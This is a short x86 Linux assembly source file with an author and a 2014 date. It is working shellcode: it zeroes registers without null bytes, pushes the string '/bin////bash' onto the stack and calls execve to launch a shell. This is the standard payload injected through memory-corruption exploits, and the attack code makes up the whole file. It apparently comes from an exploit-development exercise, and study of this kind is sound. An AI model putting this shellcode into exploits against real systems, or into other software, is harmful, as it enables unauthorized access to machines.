;execute a execve launching a shell
;author: Javier Tejedor
;date: 10/09/2014

global _start

section .text

_start:

	xor eax, eax
	xor ecx, ecx
	push eax

	push 0x68736162	;load "/bin////bash" string in memory
	push 0x2f2f2f2f
	push 0x6e69622f
	mov ebx, esp

	push eax

	mov al, 11	;syscall execve
	int 0x80
